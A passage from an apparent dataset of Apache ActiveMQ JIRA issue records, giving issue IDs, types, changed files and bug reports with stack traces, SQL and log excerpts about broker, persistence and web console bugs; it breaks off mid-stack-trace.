2010-11-12 17:46:24,124 | WARN  | Async error occurred: javax.jms.JMSException: Invalid acknowledgment: MessageAck {commandId = 29455, responseRequired = false, ackType = 3, consumerId =ID:X-2506-1289583778418-0:0:1:1, firstMessageId =ID:X-51821-634249796434830099-1:5:1:3:313195, lastMessageId = ID:X-51821-634249796434830099-1:5:1:3:313195, destination = topic://help.Publish.Instance1, transactionId = null, messageCount = 1} | org.apache.activemq.broker.TransportConnection.Service | ActiveMQ Transport: tcp:///Y:2508javax.jms.JMSException: Invalid acknowledgment: MessageAck {commandId = 29455, responseRequired = false, ackType = 3, consumerId = ID:X-2506-1289583778418-0:0:1:1, firstMessageId = ID:X09-51821-634249796434830099-1:5:1:3:313195, lastMessageId = ID:X09-51821-634249796434830099-1:5:1:3:313195, destination = topic://help.Publish.Instance1, transactionId = null, messageCount = 1}        at org.apache.activemq.broker.region.TopicSubscription.acknowledge(TopicSubscription.java:286)        at org.apache.activemq.broker.region.AbstractRegion.acknowledge(AbstractRegion.java:383)        at org.apache.activemq.broker.region.RegionBroker.acknowledge(RegionBroker.java:544)        at org.apache.activemq.broker.BrokerFilter.acknowledge(BrokerFilter.java:77)        at org.apache.activemq.broker.TransactionBroker.acknowledge(TransactionBroker.java:200)        at org.apache.activemq.broker.BrokerFilter.acknowledge(BrokerFilter.java:77)        at org.apache.activemq.broker.BrokerFilter.acknowledge(BrokerFilter.java:77)        at org.apache.activemq.broker.MutableBrokerFilter.acknowledge(MutableBrokerFilter.java:87)        at org.apache.activemq.broker.TransportConnection.processMessageAck(TransportConnection.java:469)        at org.apache.activemq.command.MessageAck.visit(MessageAck.java:214)        at org.apache.activemq.broker.TransportConnection.service(TransportConnection.java:311)        at org.apache.activemq.broker.TransportConnection$1.onCommand(TransportConnection.java:185)        at org.apache.activemq.transport.TransportFilter.onCommand(TransportFilter.java:69)        at org.apache.activemq.transport.WireFormatNegotiator.onCommand(WireFormatNegotiator.java:113)        at org.apache.activemq.transport.InactivityMonitor.onCommand(InactivityMonitor.java:228)        at org.apache.activemq.transport.TransportSupport.doConsume(TransportSupport.java:83)        at org.apache.activemq.transport.tcp.TcpTransport.doRun(TcpTransport.java:220)        at org.apache.activemq.transport.tcp.TcpTransport.run(TcpTransport.java:202)        at java.lang.Thread.run(Thread.java:619)
issueID:AMQ-3062
type:Bug
changed files:
texts:"Deflater has been closed" exception when jms.useCompression=true and using ActiveMQBytesMessage
When compression is turned on and the ActiveMQBytesMessage is used, the following exception will be encountered:java.lang.NullPointerException: Deflater has been closed at java.util.zip.Deflater.ensureOpen(Deflater.java:427) at java.util.zip.Deflater.deflate(Deflater.java:305) at java.util.zip.DeflaterOutputStream.deflate(DeflaterOutputStream.java:159) at java.util.zip.DeflaterOutputStream.finish(DeflaterOutputStream.java:134) at java.util.zip.DeflaterOutputStream.close(DeflaterOutputStream.java:146) at java.io.FilterOutputStream.close(FilterOutputStream.java:143) at org.apache.activemq.command.ActiveMQBytesMessage$1.close(ActiveMQBytesMessage.java:808) at java.io.FilterOutputStream.close(FilterOutputStream.java:143) at org.apache.activemq.command.ActiveMQBytesMessage.storeContent(ActiveMQBytesMessage.java:124) at org.apache.activemq.command.ActiveMQBytesMessage.copy(ActiveMQBytesMessage.java:109) at org.apache.activemq.command.ActiveMQBytesMessage.copy(ActiveMQBytesMessage.java:104) at org.apache.activemq.ActiveMQSession.send(ActiveMQSession.java:1735) at org.apache.activemq.ActiveMQMessageProducer.send(ActiveMQMessageProducer.java:231)
issueID:AMQ-3067
type:Bug
changed files:
texts:ActiveMQBlobMessage.copy(..) does not copy the name attribute
When using ActiveMQBlobMessage the name attribute is not copied when calling copy(...). As the default of activemq is to copy on send it get lost.
issueID:AMQ-3071
type:Bug
changed files:
texts:ConcurrentModificationException thrown in PriorityNetworkDispatchPolicy
Caused by: java.util.ConcurrentModificationExceptionat java.util.AbstractList$Itr.checkForComodification(Unknown Source)at java.util.AbstractList$Itr.next(Unknown Source)at org.apache.activemq.broker.region.policy.PriorityNetworkDispatchPolicy.dispatch(PriorityNetworkDispatchPolicy.java:50)at org.apache.activemq.broker.region.Topic.dispatch(Topic.java:588)at org.apache.activemq.broker.region.Topic.doMessageSend(Topic.java:446)at org.apache.activemq.broker.region.Topic.send(Topic.java:387)at org.apache.activemq.broker.region.AbstractRegion.send(AbstractRegion.java:354)at org.apache.activemq.broker.region.RegionBroker.send(RegionBroker.java:445)at org.apache.activemq.broker.BrokerFilter.send(BrokerFilter.java:126)at org.apache.activemq.broker.CompositeDestinationBroker.send(CompositeDestinationBroker.java:95)at org.apache.activemq.broker.TransactionBroker.send(TransactionBroker.java:224)at org.apache.activemq.broker.BrokerFilter.send(BrokerFilter.java:126)at org.apache.activemq.broker.BrokerFilter.send(BrokerFilter.java:126)at org.apache.activemq.security.AuthorizationBroker.send(AuthorizationBroker.java:187)at org.apache.activemq.broker.MutableBrokerFilter.send(MutableBrokerFilter.java:133)at org.apache.activemq.broker.TransportConnection.processMessage(TransportConnection.java:453)at org.apache.activemq.command.ActiveMQMessage.visit(ActiveMQMessage.java:631)at org.apache.activemq.broker.TransportConnection.service(TransportConnection.java:303)at org.apache.activemq.broker.TransportConnection$1.onCommand(TransportConnection.java:181)
issueID:AMQ-3074
type:Improvement
changed files:TransportConnection.java
texts:Expose TransportConnection.stopping
Pleas expose the boolean broker.TransportConnection.stopping.When an exception occurs on a TransportConnection (aka client closes or drops connection to server), there is no visibility into the fact that the connection is broken until the async stop process stops.  Often this gets delayed by other processing.  The "stopping" variable gets set immediately on exception and so processes that are doing work with the connection can check it and get immediate feedback.
issueID:AMQ-3075
type:Bug
changed files:PostgresqlJDBCAdapter.java
Statements.java
texts:Auto-create database fails with PostgreSQL (Error in SQL: &#39;drop primary key&#39;)
Trying to do a fresh install with persistence fails to create the database, with a listed database error.Persistence support added to activemq.xml file:  <bean id="postgres-ds" class="org.postgresql.ds.PGPoolingDataSource">    <property name="serverName" value="localhost"/>    <property name="databaseName" value="activemq"/>    <property name="portNumber" value="5432"/>    <property name="user" value="activemq"/>    <property name="password" value="activemq"/>    <property name="dataSourceName" value="postgres"/>    <property name="initialConnections" value="1"/>    <property name="maxConnections" value="10"/>  </bean>....        <persistenceAdapter>           <jdbcPersistenceAdapter dataSource="#postgres-ds" useDatabaseLock="false"/>        </persistenceAdapter>postgresql-8.4-701.jdbc4.jar added to the lib directoryLog from startup: INFO | Pre-instantiating singletons in org.springframework.beans.factory.support.DefaultListableBeanFactory@40b0095d: defining beans org.springframework.beans.factory.config.PropertyPlaceholderConfigurer#0,postgres-ds,org.apache.activemq.xbean.XBeanBrokerService#0,securityLoginService,securityConstraint,securityConstraintMapping,securityHandler,contexts,Server; root of factory hierarchy WARN | destroyApplicationContextOnStop parameter is deprecated, please use shutdown hooks instead INFO | PListStore:/home/wolpert/Downloads/apache-activemq-5.4.2/data/localhost/tmp_storage started INFO | Using Persistence Adapter: JDBCPersistenceAdapter(org.postgresql.ds.PGPoolingDataSource@3302fc5) INFO | Database adapter driver override recognized for : &#91;postgresql_native_driver&#93; - adapter: class org.apache.activemq.store.jdbc.adapter.PostgresqlJDBCAdapter WARN | Could not create JDBC tables; they could already exist. Failure was: ALTER TABLE ACTIVEMQ_ACKS DROP PRIMARY KEY Message: ERROR: syntax error at or near "PRIMARY"  Position: 32 SQLState: 42601 Vendor code: 0 WARN | Failure details: ERROR: syntax error at or near "PRIMARY"  Position: 32org.postgresql.util.PSQLException: ERROR: syntax error at or near "PRIMARY"  Position: 32        at org.postgresql.core.v3.QueryExecutorImpl.receiveErrorResponse(QueryExecutorImpl.java:2062)        at org.postgresql.core.v3.QueryExecutorImpl.processResults(QueryExecutorImpl.java:1795)        at org.postgresql.core.v3.QueryExecutorImpl.execute(QueryExecutorImpl.java:257)        at org.postgresql.jdbc2.AbstractJdbc2Statement.execute(AbstractJdbc2Statement.java:479)        at org.postgresql.jdbc2.AbstractJdbc2Statement.executeWithFlags(AbstractJdbc2Statement.java:353)        at org.postgresql.jdbc2.AbstractJdbc2Statement.execute(AbstractJdbc2Statement.java:345)        at sun.reflect.NativeMethodAccessorImpl.invoke0(Native Method)        at sun.reflect.NativeMethodAccessorImpl.invoke(NativeMethodAccessorImpl.java:39)        at sun.reflect.DelegatingMethodAccessorImpl.invoke(DelegatingMethodAccessorImpl.java:25)        at java.lang.reflect.Method.invoke(Method.java:597)        at org.postgresql.ds.jdbc23.AbstractJdbc23PooledConnection$StatementHandler.invoke(AbstractJdbc23PooledConnection.java:455)        at $Proxy5.execute(Unknown Source)        at org.apache.activemq.store.jdbc.adapter.DefaultJDBCAdapter.doCreateTables(DefaultJDBCAdapter.java:101)        at org.apache.activemq.store.jdbc.JDBCPersistenceAdapter.start(JDBCPersistenceAdapter.java:272)        at org.apache.activemq.broker.BrokerService.start(BrokerService.java:485)        at org.apache.activemq.xbean.XBeanBrokerService.afterPropertiesSet(XBeanBrokerService.java:60)        at sun.reflect.NativeMethodAccessorImpl.invoke0(Native Method)        at sun.reflect.NativeMethodAccessorImpl.invoke(NativeMethodAccessorImpl.java:39)        at sun.reflect.DelegatingMethodAccessorImpl.invoke(DelegatingMethodAccessorImpl.java:25)...Database reports the following with its log turned on full.2010-12-08 14:35:31 MST LOG:  execute <unnamed>: SET SESSION CHARACTERISTICS AS TRANSACTION ISOLATION LEVEL READ UNCOMMITTED2010-12-08 14:35:31 MST LOG:  execute S_1: BEGIN2010-12-08 14:35:31 MST LOG:  execute <unnamed>: SELECT NULL AS TABLE_CAT, n.nspname AS TABLE_SCHEM, c.relname AS TABLE_NAME,  CASE n.nspname ~ "^pg_" OR n.nspname = "information_schema"  WHEN true THEN CASE  WHEN n.nspname = "pg_catalog" OR n.nspname = "information_schema" THEN CASE c.relkind   WHEN "r" THEN "SYSTEM TABLE"   WHEN "v" THEN "SYSTEM VIEW"   WHEN "i" THEN "SYSTEM INDEX"   ELSE NULL   END  WHEN n.nspname = "pg_toast" THEN CASE c.relkind   WHEN "r" THEN "SYSTEM TOAST TABLE"   WHEN "i" THEN "SYSTEM TOAST INDEX"   ELSE NULL   END  ELSE CASE c.relkind   WHEN "r" THEN "TEMPORARY TABLE"   WHEN "i" THEN "TEMPORARY INDEX"   ELSE NULL   END  END  WHEN false THEN CASE c.relkind  WHEN "r" THEN "TABLE"  WHEN "i" THEN "INDEX"  WHEN "S" THEN "SEQUENCE"  WHEN "v" THEN "VIEW"  ELSE NULL  END  ELSE NULL  END  AS TABLE_TYPE, d.description AS REMARKS  FROM pg_catalog.pg_namespace n, pg_catalog.pg_class c  LEFT JOIN pg_catalog.pg_description d ON (c.oid = d.objoid AND d.objsubid = 0)  LEFT JOIN pg_catalog.pg_class dc ON (d.classoid=dc.oid AND dc.relname="pg_class")  LEFT JOIN pg_catalog.pg_namespace dn ON (dn.oid=dc.relnamespace AND dn.nspname="pg_catalog")  WHERE c.relnamespace = n.oid  AND c.relname LIKE "ACTIVEMQ_MSGS"  AND (false  OR ( c.relkind = "r" AND n.nspname !~ "^pg_" AND n.nspname <> "information_schema" ) )  ORDER BY TABLE_TYPE,TABLE_SCHEM,TABLE_NAME 2010-12-08 14:35:31 MST LOG:  execute <unnamed>: CREATE TABLE ACTIVEMQ_MSGS(ID BIGINT NOT NULL, CONTAINER VARCHAR(250), MSGID_PROD VARCHAR(250), MSGID_SEQ BIGINT, EXPIRATION BIGINT, MSG BYTEA, PRIMARY KEY ( ID ) )2010-12-08 14:35:31 MST LOG:  execute <unnamed>: CREATE INDEX ACTIVEMQ_MSGS_MIDX ON ACTIVEMQ_MSGS (MSGID_PROD,MSGID_SEQ)2010-12-08 14:35:31 MST LOG:  execute <unnamed>: CREATE INDEX ACTIVEMQ_MSGS_CIDX ON ACTIVEMQ_MSGS (CONTAINER)2010-12-08 14:35:31 MST LOG:  execute <unnamed>: CREATE INDEX ACTIVEMQ_MSGS_EIDX ON ACTIVEMQ_MSGS (EXPIRATION)2010-12-08 14:35:31 MST LOG:  execute <unnamed>: CREATE TABLE ACTIVEMQ_ACKS(CONTAINER VARCHAR(250) NOT NULL, SUB_DEST VARCHAR(250), CLIENT_ID VARCHAR(250) NOT NULL, SUB_NAME VARCHAR(250) NOT NULL, SELECTOR VARCHAR(250), LAST_ACKED_ID BIGINT, PRIMARY KEY ( CONTAINER, CLIENT_ID, SUB_NAME))2010-12-08 14:35:31 MST LOG:  execute <unnamed>: CREATE TABLE ACTIVEMQ_LOCK( ID BIGINT NOT NULL, TIME BIGINT, BROKER_NAME VARCHAR(250), PRIMARY KEY (ID) )2010-12-08 14:35:32 MST LOG:  execute <unnamed>: INSERT INTO ACTIVEMQ_LOCK(ID) VALUES (1)2010-12-08 14:35:32 MST LOG:  execute <unnamed>: ALTER TABLE ACTIVEMQ_MSGS ADD PRIORITY BIGINT2010-12-08 14:35:32 MST LOG:  execute <unnamed>: CREATE INDEX ACTIVEMQ_MSGS_PIDX ON ACTIVEMQ_MSGS (PRIORITY)2010-12-08 14:35:32 MST LOG:  execute <unnamed>: ALTER TABLE ACTIVEMQ_ACKS ADD PRIORITY BIGINT DEFAULT 5 NOT NULL2010-12-08 14:35:32 MST ERROR:  syntax error at or near "PRIMARY" at character 322010-12-08 14:35:32 MST STATEMENT:  ALTER TABLE ACTIVEMQ_ACKS DROP PRIMARY KEY2010-12-08 14:35:32 MST ERROR:  current transaction is aborted, commands ignored until end of transaction block2010-12-08 14:35:32 MST STATEMENT:  ALTER TABLE ACTIVEMQ_ACKS ADD PRIMARY KEY (CONTAINER, CLIENT_ID, SUB_NAME, PRIORITY)2010-12-08 14:35:32 MST LOG:  execute S_2: COMMIT2010-12-08 14:35:32 MST LOG:  execute <unnamed>: SET SESSION CHARACTERISTICS AS TRANSACTION ISOLATION LEVEL READ UNCOMMITTED2010-12-08 14:35:32 MST LOG:  execute S_1: BEGIN2010-12-08 14:35:32 MST ERROR:  relation "activemq_lock" does not exist at character 152010-12-08 14:35:32 MST STATEMENT:  SELECT * FROM ACTIVEMQ_LOCK FOR UPDATE2010-12-08 14:35:32 MST LOG:  execute S_3: ROLLBACK2010-12-08 14:35:32 MST LOG:  unexpected EOF on client connectionThe specific error is: ALTER TABLE ACTIVEMQ_ACKS DROP PRIMARY KEYThe first obvious question is why is the primary key being created anyways if your just dropping it. Though its likely due to upgrading the database for 5.4 from an earlier version. If the goal is to drop the "primary key constraint", the code should execute this instead:ALTER TABLE activemq_acks drop constraint activemq_acks_pkey;
issueID:AMQ-3076
type:Bug
changed files:PageFile.java
texts:spurious KahaDB warnings
please reduce to DEBUG or remove alltogether, see discussion from the mailing list belowthanks.2010-12-09 09:31:46,613 | WARN  | KahaDB PageFile flush: 3 queued writes, latch wait took 142 | org.apache.kahadb.page.PageFile | ActiveMQ Journal Checkpoint Worker2010-12-09 09:32:52,240 | WARN  | KahaDB PageFile flush: 3 queued writes, latch wait took 117 | org.apache.kahadb.page.PageFile | ActiveMQ Journal Checkpoint Worker2010-12-09 09:32:57,377 | WARN  | KahaDB PageFile flush: 3 queued writes, latch wait took 116 | org.apache.kahadb.page.PageFile | ActiveMQ Journal Checkpoint Worker2010-12-09 09:34:03,052 | WARN  | KahaDB PageFile flush: 3 queued writes, latch wait took 111 | org.apache.kahadb.page.PageFile | ActiveMQ Journal Checkpoint Worker2010-12-09 09:34:08,276 | WARN  | KahaDB PageFile flush: 3 queued writes, latch wait took 202 | org.apache.kahadb.page.PageFile | ActiveMQ Journal Checkpoint Worker2010-12-09 09:34:53,207 | WARN  | KahaDB PageFile flush: 3 queued writes, latch wait took 208 | org.apache.kahadb.page.PageFile | ActiveMQ Journal Checkpoint Worker2010-12-09 09:35:28,377 | WARN  | KahaDB PageFile flush: 3 queued writes, latch wait took 283 | org.apache.kahadb.page.PageFile | ActiveMQ Journal Checkpoint WorkerFrom: Gary Tully <gary.tully-Re5JQEeQqe8AvxtiuMwx3w@public.gmane.org>Subject: Re: KahaDB latch wait warningsNewsgroups: gmane.comp.java.activemq.userDate: Wed, 8 Dec 2010 15:24:00 +0000In the main, it is not important, that should be at debug or tracelevel logging or removed altogether, it is just an indication of thepagefile sync to disk latency and the amount of concurrent writes thatare pending at the time, an remnant of some performance tuning workthat was done for 5.4.0. the 100ms limit is arbitrary.Do u mind tracking this with a jira issue as it will probably come up again.On 8 December 2010 13:54, Aleksandar Ivanisevic<aleksandar-9OxODCspnFtM+jpbqlvknA@public.gmane.org> wrote:>>> Just switched to kahadb on my amq 5.4.1 (fuse) and the log is filling> with this:>>> 2010-12-08 14:26:12,668 | WARN  | KahaDB PageFile flush: 3 queued writes, latch wait took 119 | org.apache.kahadb.page.PageFile | ActiveMQ Journal Checkpoint Worker> 2010-12-08 14:28:03,769 | WARN  | KahaDB PageFile flush: 7 queued writes, latch wait took 140 | org.apache.kahadb.page.PageFile | ActiveMQ Journal Checkpoint Worker> 2010-12-08 14:28:39,125 | WARN  | KahaDB PageFile flush: 3 queued writes, latch wait took 112 | org.apache.kahadb.page.PageFile | ActiveMQ Journal Checkpoint Worker> 2010-12-08 14:30:04,928 | WARN  | KahaDB PageFile flush: 8 queued writes, latch wait took 109 | org.apache.kahadb.page.PageFile | ActiveMQ Journal Checkpoint Worker> 2010-12-08 14:30:28,788 | WARN  | KahaDB PageFile flush: 8 queued writes, latch wait took 18839 | org.apache.kahadb.page.PageFile | ActiveMQ Journal Checkpoint Worker>> quick code search turns out that this warning is fixed to 100ms>> http://bit.ly/gYH1Zu>> why 100ms and why is this important?
issueID:AMQ-3077
type:Bug
changed files:
texts:ArraysIndexOutOfBoundsException : -32768 in "BrokerService[xxx] Task" thread
Exception in thread "BrokerService&#91;SUP-tterdp31v&#93; Task" java.lang.ArrayIndexOutOfBoundsException: -32767        at org.apache.activemq.openwire.BooleanStream.writeBoolean(BooleanStream.java:54)        at org.apache.activemq.openwire.OpenWireFormat.tightMarshalNestedObject1(OpenWireFormat.java:377)        at org.apache.activemq.openwire.v6.BaseDataStreamMarshaller.tightMarshalNestedObject1(BaseDataStreamMarshaller.java:131)        at org.apache.activemq.openwire.v6.BaseDataStreamMarshaller.tightMarshalObjectArray1(BaseDataStreamMarshaller.java:357)        at org.apache.activemq.openwire.v6.BrokerInfoMarshaller.tightMarshal1(BrokerInfoMarshaller.java:106)        at org.apache.activemq.openwire.OpenWireFormat.tightMarshalNestedObject1(OpenWireFormat.java:397)        at org.apache.activemq.openwire.v6.BaseDataStreamMarshaller.tightMarshalNestedObject1(BaseDataStreamMarshaller.java:131)        at org.apache.activemq.openwire.v6.BaseDataStreamMarshaller.tightMarshalObjectArray1(BaseDataStreamMarshaller.java:357)        at org.apache.activemq.openwire.v6.BrokerInfoMarshaller.tightMarshal1(BrokerInfoMarshaller.java:106)        at org.apache.activemq.openwire.OpenWireFormat.tightMarshalNestedObject1(OpenWireFormat.java:397)        at org.apache.activemq.openwire.v6.BaseDataStreamMarshaller.tightMarshalNestedObject1(BaseDataStreamMarshaller.java:131)        at org.apache.activemq.openwire.v6.BaseDataStreamMarshaller.tightMarshalObjectArray1(BaseDataStreamMarshaller.java:357)        at org.apache.activemq.openwire.v6.BrokerInfoMarshaller.tightMarshal1(BrokerInfoMarshaller.java:106)        at org.apache.activemq.openwire.OpenWireFormat.tightMarshalNestedObject1(OpenWireFormat.java:397)        at org.apache.activemq.openwire.v6.BaseDataStreamMarshaller.tightMarshalNestedObject1(BaseDataStreamMarshaller.java:131)        at org.apache.activemq.openwire.v6.BaseDataStreamMarshaller.tightMarshalObjectArray1(BaseDataStreamMarshaller.java:357)        at org.apache.activemq.openwire.v6.BrokerInfoMarshaller.tightMarshal1(BrokerInfoMarshaller.java:106)        at org.apache.activemq.openwire.OpenWireFormat.tightMarshalNestedObject1(OpenWireFormat.java:397)        at org.apache.activemq.openwire.v6.BaseDataStreamMarshaller.tightMarshalNestedObject1(BaseDataStreamMarshaller.java:131)        at org.apache.activemq.openwire.v6.BaseDataStreamMarshaller.tightMarshalObjectArray1(BaseDataStreamMarshaller.java:357)        at org.apache.activemq.openwire.v6.BrokerInfoMarshaller.tightMarshal1(BrokerInfoMarshaller.java:106)        at org.apache.activemq.openwire.OpenWireFormat.tightMarshalNestedObject1(OpenWireFormat.java:397)        at org.apache.activemq.openwire.v6.BaseDataStreamMarshaller.tightMarshalNestedObject1(BaseDataStreamMarshaller.java:131)        at org.apache.activemq.openwire.v6.BaseDataStreamMarshaller.tightMarshalObjectArray1(BaseDataStreamMarshaller.java:357)        at org.apache.activemq.openwire.v6.BrokerInfoMarshaller.tightMarshal1(BrokerInfoMarshaller.java:106)        at org.apache.activemq.openwire.OpenWireFormat.tightMarshalNestedObject1(OpenWireFormat.java:397)        at org.apache.activemq.openwire.v6.BaseDataStreamMarshaller.tightMarshalNestedObject1(BaseDataStreamMarshaller.java:131)        at org.apache.activemq.openwire.v6.BaseDataStreamMarshaller.tightMarshalObjectArray1(BaseDataStreamMarshaller.java:357)        at org.apache.activemq.openwire.v6.BrokerInfoMarshaller.tightMarshal1(BrokerInfoMarshaller.java:106)        at org.apache.activemq.openwire.OpenWireFormat.tightMarshalNestedObject1(OpenWireFormat.java:397)        at org.apache.activemq.openwire.v6.BaseDataStreamMarshaller.tightMarshalNestedObject1(BaseDataStreamMarshaller.java:131)        at org.apache.activemq.openwire.v6.BaseDataStreamMarshaller.tightMarshalObjectArray1(BaseDataStreamMarshaller.java:357)        at org.apache.activemq.openwire.v6.BrokerInfoMarshaller.tightMarshal1(BrokerInfoMarshaller.java:106)        at org.apache.activemq.openwire.OpenWireFormat.marshal(OpenWireFormat.java:228)        at org.apache.activemq.transport.tcp.TcpTransport.oneway(TcpTransport.java:181)        at org.apache.activemq.transport.InactivityMonitor.oneway(InactivityMonitor.java:255)        at org.apache.activemq.transport.TransportFilter.oneway(TransportFilter.java:85)        at org.apache.activemq.transport.WireFormatNegotiator.oneway(WireFormatNegotiator.java:104)        at org.apache.activemq.transport.MutexTransport.oneway(MutexTransport.java:40)        at org.apache.activemq.broker.TransportConnection.dispatch(TransportConnection.java:1249)        at org.apache.activemq.broker.TransportConnection.processDispatch(TransportConnection.java:810)        at org.apache.activemq.broker.TransportConnection.iterate(TransportConnection.java:846)        at org.apache.activemq.thread.PooledTaskRunner.runTask(PooledTaskRunner.java:122)        at org.apache.activemq.thread.PooledTaskRunner$1.run(PooledTaskRunner.java:43)        at java.util.concurrent.ThreadPoolExecutor$Worker.runTask(ThreadPoolExecutor.java:886)        at java.util.concurrent.ThreadPoolExecutor$Worker.run(ThreadPoolExecutor.java:908)        at java.lang.Thread.run(Thread.java:619)Today this exception is not written in ActiveMQ logs but on the standard output. It seems that happens when network of brokers connections are stopped, but I"m not sure at all. (the number of "bridge to ... stopped" seems to be the same as the number of Exceptions detected)So I need to dig into this problem to be more precise.Eric-AWL
issueID:AMQ-3078
type:Improvement
changed files:
texts:Copyright message is out of date in admin console
The copyright message at the bottom of the AcctiveMQ console (http://localhost:8161/admin/) is out of date.Message reads: "Copyright 2005-2007 The Apache Software Foundation"but should read:"Copyright 2005-2010 The Apache Software Foundation".Note, there are several different ways that the last value (2010) could be automated to pick up the current year, or the year relative to the build date.
issueID:AMQ-3081
type:Bug
changed files:
texts:Durable subscriptions are not removed from mbean
This is related to https://issues.apache.org/jira/browse/AMQ-3013 ... Subscription mbeans are not actually removed from the context.
issueID:AMQ-3084
type:Bug
changed files:
texts:Typo "DispachedCounter" in response when running activemq-admin
Running "activemq-admin query | grep Disp" makes this very apparent.Sampled output:DispatchedQueueSize = 0DispachedCounter = 0DispatchedQueueSize = 0DispachedCounter = 0DispatchedQueueSize = 0DispachedCounter = 0DispatchedQueueSize = 0DispachedCounter = 1043173DispatchedQueueSize = 0DispachedCounter = 1042918I was able to grep out some instances of this here:totem:activemq michael$ grep -iR dispached ../activemq-core/src/main/java/org/apache/activemq/broker/jmx/.svn/text-base/SubscriptionView.java.svn-base:    public long getDispachedCounter() {./activemq-core/src/main/java/org/apache/activemq/broker/jmx/.svn/text-base/SubscriptionViewMBean.java.svn-base:    long getDispachedCounter();./activemq-core/src/main/java/org/apache/activemq/broker/jmx/SubscriptionView.java:    public long getDispachedCounter() {./activemq-core/src/main/java/org/apache/activemq/broker/jmx/SubscriptionViewMBean.java:    long getDispachedCounter();./activemq-web-console/src/main/webapp/connection.jsp: <td><c:out value="${consumer.dispachedCounter}" /></td>./activemq-web-console/src/main/webapp/queueConsumers.jsp: <td>${row.dispachedCounter}</td>./activemq-web-console/src/main/webapp/subscribers.jsp:<td>${row.dispachedCounter}</td>./activemq-web-console/src/main/webapp/subscribers.jsp:<td>${row.dispachedCounter}</td>
issueID:AMQ-3085
type:Bug
changed files:
texts:IndexOutOfBoundsException on FailoverTransport.updateURIs after: already known: java.net.UnknownHostException
broker returned hosts that are not resolvable on the client can throw the update logic in the failover transport off. Disabling update works around this (updateURIsSupported=false on the failover uri). It should be possible to disable the sending on the broker side also.symptom:2010-12-10 07:48:16,574 [ActiveMQ Transport: tcp://xx:61616] DEBUG  failover.FailoverTransport:228 - Transport failed with the following exception:java.io.IOException: Unexpected error occured at org.apache.activemq.transport.tcp.TcpTransport.run(TcpTransport.java:208) ~[activemq-core-5.4.1.jar:5.4.1-fuse-01-00] at java.lang.Thread.run(Thread.java:619) [na:1.6.0_12]Caused by: java.lang.IndexOutOfBoundsException: Index: 12, Size: 11 at java.util.concurrent.CopyOnWriteArrayList.add(CopyOnWriteArrayList.java:409) ~[na:1.6.0_12] at org.apache.activemq.transport.failover.FailoverTransport.add(FailoverTransport.java:613) ~[activemq-core-5.4.1.jar:5.4.1-fuse-01-00] at org.apache.activemq.transport.failover.FailoverTransport.updateURIs(FailoverTransport.java:1046) ~[activemq-core-5.4.1.jar:5.4.1-fuse-01-00] at org.apache.activemq.transport.failover.FailoverTransport.processNewTransports(FailoverTransport.java:285) ~[activemq-core-5.4.1.jar:5.4.1-fuse-01-00] at org.apache.activemq.transport.failover.FailoverTransport.handleConnectionControl(FailoverTransport.java:265) ~[activemq-core-5.4.1.jar:5.4.1-fuse-01-00] at org.apache.activemq.transport.failover.FailoverTransport$3.onCommand(FailoverTransport.java:177) ~[activemq-core-5.4.1.jar:5.4.1-fuse-01-00] at org.apache.activemq.transport.WireFormatNegotiator.onCommand(WireFormatNegotiator.java:113) ~[activemq-core-5.4.1.jar:5.4.1-fuse-01-00] at org.apache.activemq.transport.InactivityMonitor.onCommand(InactivityMonitor.java:228) ~[activemq-core-5.4.1.jar:5.4.1-fuse-01-00] at org.apache.activemq.transport.TransportSupport.doConsume(TransportSupport.java:83) ~[activemq-core-5.4.1.jar:5.4.1-fuse-01-00] at org.apache.activemq.transport.tcp.TcpTransport.doRun(TcpTransport.java:219) ~[activemq-core-5.4.1.jar:5.4.1-fuse-01-00] at org.apache.activemq.transport.tcp.TcpTransport.run(TcpTransport.java:201) ~[activemq-core-5.4.1.jar:5.4.1-fuse-01-00] ... 1 common frames omitted
issueID:AMQ-3088
type:Bug
changed files:scheduled.jsp
BrokerFacade.java
BrokerFacadeSupport.java
texts:ActiveMQ Web Console "Scheduled" Tab Invocation Fails and returns an unclear message.
Clicking on the "Scheduled" tab of the AMQ Web Console redirects to a page where all the tabs are removed (Home | Queues | Topics | Subscribers | Connections | Scheduled | Send) and the following message is presented:"Error! Exception occurred while processing this request, check the log for more information!"It is not intuitive why this is occurring.  From a design approach, I would expect the tabs to remain and a more descriptive error message to be provided, and maybe even a link to related documentation.   I had to do a top-level search to get to this page: http://activemq.apache.org/delay-and-schedule-message-delivery.html.  I assume it"s related.In the log you will find this (as such, I assume the scheduling features aren"t being used and the web site isn"t gracefully reporting on this):2010-12-15 10:03:36,069 | WARN  | /admin/scheduled.jsp | org.eclipse.jetty.util.log | qtp27635615-44javax.el.ELException: java.lang.IllegalArgumentException: Null object name at javax.el.BeanELResolver.getValue(BeanELResolver.java:298) at javax.el.CompositeELResolver.getValue(CompositeELResolver.java:175) at com.sun.el.parser.AstValue.getValue(AstValue.java:138) at com.sun.el.ValueExpressionImpl.getValue(ValueExpressionImpl.java:206) at org.apache.jasper.runtime.PageContextImpl.evaluateExpression(PageContextImpl.java:1001) at org.apache.jsp.scheduled_jsp._jspx_meth_c_forEach_0(org.apache.jsp.scheduled_jsp:118) at org.apache.jsp.scheduled_jsp._jspService(org.apache.jsp.scheduled_jsp:90) at org.apache.jasper.runtime.HttpJspBase.service(HttpJspBase.java:109) at javax.servlet.http.HttpServlet.service(HttpServlet.java:806) at org.apache.jasper.servlet.JspServletWrapper.service(JspServletWrapper.java:389) at org.apache.jasper.servlet.JspServlet.serviceJspFile(JspServlet.java:486) at org.apache.jasper.servlet.JspServlet.service(JspServlet.java:380) at javax.servlet.http.HttpServlet.service(HttpServlet.java:806) at org.eclipse.jetty.servlet.ServletHolder.handle(ServletHolder.java:527) at org.eclipse.jetty.servlet.ServletHandler$CachedChain.doFilter(ServletHandler.java:1216) at org.springframework.web.filter.RequestContextFilter.doFilterInternal(RequestContextFilter.java:83) at org.springframework.web.filter.OncePerRequestFilter.doFilter(OncePerRequestFilter.java:76) at org.eclipse.jetty.servlet.ServletHandler$CachedChain.doFilter(ServletHandler.java:1187) at org.apache.activemq.web.SessionFilter.doFilter(SessionFilter.java:45) at org.eclipse.jetty.servlet.ServletHandler$CachedChain.doFilter(ServletHandler.java:1187) at org.apache.activemq.web.filter.ApplicationContextFilter.doFilter(ApplicationContextFilter.java:81) at org.eclipse.jetty.servlet.ServletHandler$CachedChain.doFilter(ServletHandler.java:1187) at com.opensymphony.module.sitemesh.filter.PageFilter.parsePage(PageFilter.java:118) at com.opensymphony.module.sitemesh.filter.PageFilter.doFilter(PageFilter.java:52) at org.eclipse.jetty.servlet.ServletHandler$CachedChain.doFilter(ServletHandler.java:1187) at 